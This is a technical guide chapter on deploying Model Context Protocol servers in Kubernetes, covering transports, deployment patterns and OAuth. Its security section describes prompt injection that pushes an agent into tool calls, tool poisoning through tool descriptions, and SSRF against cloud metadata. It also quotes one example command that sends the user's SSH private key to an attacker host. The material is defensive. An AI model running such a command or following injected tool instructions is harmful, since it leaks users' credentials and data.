# 2. MCP Deployed Inside Kubernetes

> Verified against **MCP specification revision `2026-07-28`** — the current revision as of
> August 2026. This revision made breaking changes to Streamable HTTP; if you have read older
> material (or been told about MCP by a model trained before mid-2026), §2.3 is where your mental
> model most likely needs correcting.

---

## 2.1 What MCP actually is

The **Model Context Protocol** is a JSON-RPC 2.0 protocol that standardises how an LLM application
obtains context and calls tools. It plays the same role for AI applications that the Language
Server Protocol plays for editors: instead of N applications each writing M bespoke integrations,
everyone speaks one protocol.

Three roles:

| Role | Definition |
|---|---|
| **Host** | The LLM application (an agent, an IDE, a chat product). Owns the model and the user relationship. |
| **Client** | The connector *inside* the host. One client per connected server; maintains that connection. |
| **Server** | The process exposing capabilities — a GitHub server, a Postgres server, an internal payments server. |

A host with five MCP servers runs five clients. That 1:1 client↔server pairing is the isolation
boundary: one server cannot see another server's traffic.

### The primitives

**Servers offer to clients:**

- **Tools** — functions the *model* can invoke (`tools/list`, `tools/call`). Model-controlled.
- **Resources** — data identified by URI that the *application* reads (`resources/read`).
  Application-controlled.
- **Prompts** — templated workflows the *user* explicitly selects (`prompts/get`). User-controlled.

**Clients offer to servers:**

- **Sampling** — the server asks the host to run an LLM completion. This lets a server implement
  agentic behaviour without holding its own model credentials.
- **Roots** — the server asks which filesystem/URI boundaries it may operate in.
- **Elicitation** — the server asks the user for additional information mid-operation.

> The *who controls this* column is the security design of MCP in miniature. Tools are
> model-controlled, and the model can be influenced by untrusted text. That is the whole problem.

---

## 2.2 Transports

**stdio** — the server is a subprocess; messages travel over stdin/stdout. Used for local,
single-user servers. In Kubernetes this maps to a **sidecar container** (see §2.5). Credentials
come from the environment, *not* from OAuth.

**Streamable HTTP** — the server is an independent networked process. This is the transport for
anything deployed in a cluster.

The older **HTTP+SSE** transport (revision `2024-11-05`) is deprecated and should not be used in
new work.

---

## 2.3 Streamable HTTP as of `2026-07-28` — read this carefully

Revision `2026-07-28` changed this transport substantially. The changes are overwhelmingly good
news for Kubernetes operators.

### What the transport is now

- The server exposes **one HTTP endpoint** that accepts **POST** (e.g. `https://host/mcp`).
- **Every JSON-RPC request or notification is its own HTTP POST.** No long-lived duplex channel.
- The server answers each request with **either** a single JSON object **or** an SSE stream scoped
  to *that one request*, carrying progress notifications and then the final response.
- Clients must send `Accept: application/json, text/event-stream`.
- A notification POST that is accepted returns `202 Accepted` with no body.

### What was REMOVED in this revision

This is the part most existing material gets wrong:

| Removed | Was |
|---|---|
| **Protocol-level sessions** | `Mcp-Session-Id` header, terminated by HTTP DELETE |
| **The GET stream endpoint** | A standalone SSE stream for server-initiated messages |
| **Stream resumability** | `Last-Event-ID` replay |
| **Server-initiated JSON-RPC requests on streams** | Servers could push `sampling/*` requests |
| **The `initialize` handshake** (as the version mechanism) | Capability negotiation on connect |

A server implementing only this revision should answer GET or DELETE on the MCP endpoint with
`405 Method Not Allowed`, ignore any `Mcp-Session-Id`, and ignore `Last-Event-ID`.

### Why removing sessions is a big deal in Kubernetes

**MCP is now stateless at the protocol level.** Consequences, all of them good:

- No sticky sessions, no session affinity, no consistent hashing in your Service or Gateway.
- Any replica can serve any request → a plain `ClusterIP` Service with round-robin is correct.
- Horizontal Pod Autoscaling actually works — you can scale in without breaking live sessions.
- Rolling updates stop dropping conversations.
- No shared session store (Redis) needed just to run more than one replica.

If a server *does* need state across requests, it now mints an explicit **state handle** (a cart
ID, a workflow ID) and receives it back as an ordinary tool argument. That moves state into the
application layer where you can authorize it — and creates the **state handle hijacking** risk
covered in §2.8.

### Version negotiation (replaces `initialize`)

Every request declares its version in two places, which must agree:

- In the body: `params._meta["io.modelcontextprotocol/protocolVersion"]`
- In the header: `MCP-Protocol-Version: 2026-07-28`

The server accepts or rejects **each request independently**. If it doesn't support the version, it
returns `400` with an `UnsupportedProtocolVersionError` listing what it does support.

A client that wants to know up front calls **`server/discover`** — a mandatory RPC returning
supported versions, capabilities and identity in one request. Calling it is optional; you may just
send a request and handle a version error.

### Mirrored headers — the Kubernetes-relevant feature

The transport mirrors selected body fields into HTTP headers **so that intermediaries can route and
inspect without parsing the JSON body**:

| Header | Source | Required for |
|---|---|---|
| `MCP-Protocol-Version` | negotiated version | all requests |
| `Mcp-Method` | `method` | all requests |
| `Mcp-Name` | `params.name` / `params.uri` | `tools/call`, `resources/read`, `prompts/get` |
| `Mcp-Param-{Name}` | tool params tagged `x-mcp-header` in `inputSchema` | opt-in per server |

```http
POST /mcp HTTP/1.1
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: execute_sql
Mcp-Param-Region: us-west1
```

This is what lets a Gateway or service mesh apply **per-tool** policy — rate-limit `delete_*`,
route `Mcp-Param-Region: eu-west1` to an EU cluster, alert on `Mcp-Name: execute_sql` — without an
L7 filter that deserialises every request body.

**The matching security rule is mandatory and easy to skip:** any server that processes the body
**MUST** validate that header values match the body values, rejecting mismatches with `400` and
JSON-RPC error `-32020` (`HeaderMismatch`). Without this, a load balancer routes on the header while
the server executes on the body — an attacker sets `Mcp-Name: read_file` to slip past a gateway rule
and puts `delete_database` in the body. Two components, two sources of truth, one bypass.

Intermediaries enforcing policy on mirrored headers **SHOULD** additionally verify that
`MCP-Protocol-Version` indicates a revision that requires header/body validation, and reject the
request otherwise — an old-version client's headers are not trustworthy.

### Server→client interaction: MRTR

Because servers can no longer push requests, sampling/elicitation/roots use **Multi Round-Trip
Requests**: the server returns an `InputRequiredResult` containing `inputRequests`, and the client
**retries the original request** with matching `inputResponses`.

```
Client → POST tools/call (id 1)
Server → InputRequiredResult (inputRequests: elicitation/create)
         [client gathers input from the user]
Client → POST tools/call (id 2)  ← original params + inputResponses
Server → final result
```

Operationally this means a "single" tool call can be several HTTP round trips, each independently
routed. Your traces need a correlation ID; your gateway must not assume one request equals one
user-visible operation.

### Long-lived notifications and cancellation

- Change notifications (`tools/list_changed`, `resources/updated`) arrive on the response stream of
  a **`subscriptions/listen`** request, which stays open. Request-scoped notifications
  (`progress`, `message`) flow only on the stream of the request they belong to.
- Servers should send `X-Accel-Buffering: no` so nginx-style proxies don't buffer SSE, and should
  emit periodic SSE comment lines (`:\r\n`) as keep-alives on long-lived streams.
- **Cancellation = closing the SSE response stream.** There is no `notifications/cancelled` on this
  transport. So your ingress idle-timeout is now a cancellation signal — set it deliberately, and
  longer than your slowest tool.

---

## 2.4 Where MCP servers sit in an agent stack

```
        ┌──────────────────────────────────────────────┐
        │  Agent Pod                                   │
        │  ┌────────────┐   MCP client(s)              │
        │  │ Agent      ├──────┬──────────┬────────────┼──► MCP Server A (Service)
        │  │ (host)     │      │          │            │
        │  └─────┬──────┘      │          └────────────┼──► MCP Server B (sidecar, stdio)
        │        │             └───────────────────────┼──► MCP Server C (external, egress)
        │        │ inference                           │
        └────────┼─────────────────────────────────────┘
                 ▼
        Model serving Service (vLLM / KServe)
```

The agent is the **host**. It holds the model connection *and* the MCP clients. MCP servers do not
call the model — except via sampling, which routes back through the host.

---

## 2.5 Deployment patterns

### Pattern A — Sidecar (stdio)

MCP server runs as a container in the agent's Pod; the agent speaks stdio to it.

```yaml
spec:
  initContainers:
    - name: mcp-filesystem
      image: registry.internal/mcp-filesystem@sha256:...
      restartPolicy: Always      # ← native sidecar: starts first, stops last
      securityContext:
        runAsNonRoot: true
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities: { drop: ["ALL"] }
  containers:
    - name: agent
      image: registry.internal/agent@sha256:...
```

- **Good:** no network exposure at all, lifecycle tied to the agent, per-agent isolation, no
  authorization layer needed (the boundary is the Pod).
- **Bad:** scales only with the agent, wastes resources when idle, an update means redeploying every
  agent, no cross-team sharing.
- **Use when:** the server is agent-specific, holds no shared state, or must not be reachable over
  the network at all.

### Pattern B — Standalone Service (Streamable HTTP)

MCP server is its own Deployment + Service, shared by many agents.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata: { name: mcp-github }
spec:
  replicas: 3                     # trivially safe: the protocol is stateless
  template:
    spec:
      automountServiceAccountToken: false
      containers:
        - name: server
          image: registry.internal/mcp-github@sha256:...
          ports: [{ containerPort: 8080 }]
          securityContext:
            runAsNonRoot: true
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
          resources:
            requests: { cpu: 100m, memory: 128Mi }
            limits:   { cpu: 500m, memory: 512Mi }
---
apiVersion: v1
kind: Service
metadata: { name: mcp-github }
spec:
  selector: { app: mcp-github }
  ports: [{ port: 443, targetPort: 8080 }]
```

- **Good:** independently scalable and updatable, shared across teams, centrally observable and
  policed.
- **Bad:** now a network service — needs authentication, authorization, NetworkPolicy, TLS. It is a
  shared blast radius.
- **Use when:** multiple agents need the same capability, or the server holds pooled connections
  (a database) that shouldn't be duplicated per agent.

### Pattern C — MCP Gateway / registry

A cluster-internal gateway that fronts many MCP servers, presenting one endpoint to agents. Because
of mirrored headers it can route on `Mcp-Method` and `Mcp-Name` without body parsing.

Responsibilities: server discovery and catalogue, per-tool authorization, credential brokering
(exchanging the agent's identity for a downstream token — *never* passing the token through), rate
limiting per tool, audit logging of every `tools/call`, and tool-definition pinning to prevent rug
pulls.

- **Use when:** you have more than a handful of servers, multiple teams, or a compliance requirement
  to audit every tool invocation centrally.

### Pattern D — External / third-party server

Runs outside the cluster. Requires deliberate **egress**: explicit egress NetworkPolicy, an egress
gateway or proxy with an allowlist, and — importantly — treatment as fully untrusted. See the SSRF
and tool-poisoning discussion in §2.8.

### Choosing

| Question | Sidecar | Service | Gateway |
|---|:--:|:--:|:--:|
| Used by exactly one agent? | ✅ | | |
| Shared by several agents/teams? | | ✅ | ✅ |
| Needs to scale independently? | | ✅ | ✅ |
| Must never be network-reachable? | ✅ | | |
| Need central per-tool audit/policy? | | | ✅ |
| Holds pooled DB connections? | | ✅ | |

---

## 2.6 Discovery and configuration

Inside the cluster, MCP servers are found through ordinary Kubernetes DNS:
`mcp-github.tools.svc.cluster.local`. Do **not** invent a bespoke discovery mechanism — Services and
EndpointSlices already solve this, including health-gating by readiness probe.

Because the protocol is stateless, the ordinary `ClusterIP` round-robin is correct. Reserve headless
Services for cases where the client genuinely needs to address individual pods.

Server catalogues (which servers exist, which tools they expose, which teams may use them) belong in
a registry — either a CRD reconciled by an operator, or the MCP gateway's own catalogue.

---

## 2.7 Authorization: OAuth 2.1

MCP authorization is **optional**, but for any HTTP-transport server it is the expected mechanism.
stdio servers should **not** use it — they take credentials from the environment.

The role mapping:

- **MCP server = OAuth 2.1 resource server.** It validates tokens. It does not issue them.
- **MCP client = OAuth 2.1 client.**
- **Authorization server** is separate (your IdP, or Keycloak/Dex in-cluster).

The required mechanics:

1. Unauthenticated request → `401` with a `WWW-Authenticate: Bearer resource_metadata="..."` header,
   and **SHOULD** include `scope="..."` naming the scopes needed.
2. MCP servers **MUST** implement **Protected Resource Metadata (RFC 9728)** at
   `/.well-known/oauth-protected-resource`; clients **MUST** use it for authorization server
   discovery.
3. Authorization servers **MUST** offer RFC 8414 or OpenID Connect Discovery metadata; clients
   **MUST** support both.
4. Clients **MUST** implement **Resource Indicators (RFC 8707)** — the `resource` parameter, carrying
   the MCP server's canonical URI, in **both** the authorization and token requests, *whether or not*
   the AS supports it. This is what binds the token's audience to one specific server.
5. **PKCE** on every flow.
6. Clients **MUST** validate the `iss` parameter in the authorization response (RFC 9207) against
   the issuer recorded before redirecting — this is the mix-up attack defence, and PKCE alone does
   **not** provide it.
7. Client registration: **Client ID Metadata Documents** are now the preferred mechanism (an HTTPS
   URL as `client_id`); Dynamic Client Registration (RFC 7591) is deprecated and retained only for
   backwards compatibility.
8. `Authorization: Bearer <token>` on **every** request. Never in a query string.

### The rule that matters most

> **MCP servers MUST NOT accept any token that was not explicitly issued for them.**
> **MCP servers MUST NOT accept or transit any other tokens.**

This forbids **token passthrough** — accepting the client's token and forwarding it downstream. It
is explicitly an anti-pattern in the spec, and it is the single most common serious mistake in MCP
deployments. The correct pattern is **token exchange**: the MCP server validates the inbound token's
audience, then obtains its *own* separate credential for the downstream API.

Why it matters: passthrough breaks rate limiting and request validation that key on audience,
destroys the audit trail (downstream logs show the wrong principal), and turns the MCP server into a
data-exfiltration proxy for anyone holding a stolen token.

---

## 2.8 MCP-specific attacks and mitigations

These are drawn from the spec's own security guidance plus the surrounding ecosystem. They are
*additional* to everything in Chapter 1 — a hardened cluster does not make a hardened MCP server.

### Prompt injection → tool invocation

**The defining risk of the whole architecture.** A model reads untrusted content (a web page, an
email, a PR description, a database row) that contains instructions. The model cannot reliably
distinguish data from instructions, and calls a tool.

Mitigations — defence in depth, because none is sufficient alone:

- Human approval for any consequential/irreversible action. The spec is explicit: hosts **must**
  obtain user consent before invoking a tool.
- Least-privilege tool design: expose `get_issue`, not `run_sql`. The blast radius of a tool call is
  a function of what the tool can do.
- Separate read-only tools from mutating tools, and require step-up authorization for the latter.
- Treat all tool *output* as untrusted input to the next model turn.
- Constrain outputs with schemas; validate before acting.
- Watch for the **"lethal trifecta"**: private data access + untrusted content + external
  communication. An agent with all three can be made to exfiltrate. Break one leg — usually the
  egress leg, with NetworkPolicy.

### Tool poisoning and rug pulls

A malicious server puts instructions in a tool *description* (which the model reads), or serves a
benign definition at approval time and swaps it later.

- The spec states tool descriptions and annotations **must be considered untrusted** unless the
  server itself is trusted.
- Pin tool definitions by hash; re-prompt for approval when they change.
- Run an internal registry of reviewed servers; pin images by digest.
- Alert on `notifications/tools/list_changed` from production servers.

### Confused deputy

An MCP proxy server using a **static client ID** with a third-party AS, while allowing MCP clients to
dynamically register, lets an attacker ride the third-party's consent cookie: the AS skips the
consent screen and the authorization code lands on the attacker's `redirect_uri`.

Mitigations, all **MUST** in the spec: per-client consent stored server-side and checked *before*
forwarding to the third party; a consent UI that names the client, the scopes, and the redirect URI,
with CSRF protection and `frame-ancestors`/`X-Frame-Options: DENY`; **exact-string** redirect URI
matching (no wildcards); consent cookies with `__Host-` prefix, `Secure`, `HttpOnly`,
`SameSite=Lax`, bound to the specific `client_id`; and single-use, short-lived `state` values stored
only *after* consent is approved.

### SSRF during OAuth discovery

A malicious MCP server returns `resource_metadata` (or `authorization_servers`, or `token_endpoint`)
pointing at `http://169.254.169.254/` and the client fetches it — leaking cloud credentials.

- Require HTTPS for all OAuth URLs (loopback excepted, for dev only).
- Block private/reserved ranges: `10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`,
  `fc00::/7`, `fe80::/10`. **Do not hand-roll the IP parsing** — octal/hex/IPv4-mapped-IPv6 tricks
  defeat naive parsers.
- Apply the same validation to every redirect hop; consider disabling automatic redirects.
- Prefer an egress proxy (e.g. Smokescreen) that blocks internal destinations by design — in
  Kubernetes this pairs naturally with an egress NetworkPolicy.
- Beware DNS TOCTOU: a name can resolve safely at validation and internally at fetch. Pin the
  resolved IP between check and use.

### State handle hijacking

Since there are no protocol sessions, servers mint explicit handles. If a server treats *possession*
of a handle as authentication, anyone who guesses or steals one acts as that user.

- Servers implementing authorization **MUST** verify every inbound request and **MUST NOT** treat a
  handle as authentication.
- Use cryptographically random, non-sequential, expiring handles.
- Bind handles server-side to the authenticated principal — key state as `<user_id>:<handle>` where
  `user_id` comes from the **verified token**, never from the client — and reject a handle presented
  by anyone else.

### Local server compromise / malicious startup commands

A one-click server config containing `npx something && curl -d @~/.ssh/id_rsa https://evil/`.
Clients supporting one-click config **MUST** show the full untruncated command and require explicit
approval. Sandbox spawned servers; prefer stdio so the server is reachable only by its client.

### OAuth authorization URL validation

A malicious server supplies a `javascript:` or shell-injecting authorization URL.

- Clients **MUST** allowlist `http`/`https` only (http for loopback dev only) and reject
  `javascript:`, `data:`, `file:`, `vbscript:`.
- Clients **MUST NOT** open URLs via a shell (`cmd.exe`, `sh`, PowerShell).

### Scope minimisation

Don't publish every scope in `scopes_supported` and don't request them all up front. Start with a
minimal read/discovery scope; elevate incrementally via `WWW-Authenticate: ... scope="files:write"`
challenges. Clients accumulate scopes by taking the **union** of previously granted and newly
challenged scopes when re-authorizing. Avoid `*`, `all`, `full-access`.

---

## 2.9 Kubernetes controls mapped onto MCP risks

This is where the two halves of this material meet.

| MCP risk | Kubernetes control that helps |
|---|---|
| Compromised MCP server pivots through the cluster | Default-deny NetworkPolicy; per-server ServiceAccount; `automountServiceAccountToken: false` |
| Agent exfiltrates data after prompt injection | **Egress** NetworkPolicy + egress gateway allowlist — the practical way to break the lethal trifecta |
| SSRF to cloud metadata | Egress policy blocking `169.254.169.254`; correct IRSA/Workload Identity scoping |
| Malicious server image | Sigstore signature verification at admission; digest-pinned images; internal registry |
| Server escapes its container | PSA `restricted`; drop ALL capabilities; `readOnlyRootFilesystem`; gVisor/Kata for untrusted code |
| Credentials in env vars | External Secrets Operator / CSI Secret Store; short-lived projected tokens; encrypt etcd at rest |
| Runaway tool call storm | Resource limits; per-tool rate limiting at the MCP gateway keyed on `Mcp-Name` |
| No audit trail of tool use | Gateway-level structured logging of `Mcp-Method`/`Mcp-Name`; Kubernetes audit log |
| Server-to-server impersonation | Service mesh mTLS with SPIFFE identities; AuthorizationPolicy per service account |

---

**Next:** [3. Models, Agents and A2A →](./03-models-agents-and-a2a.md)
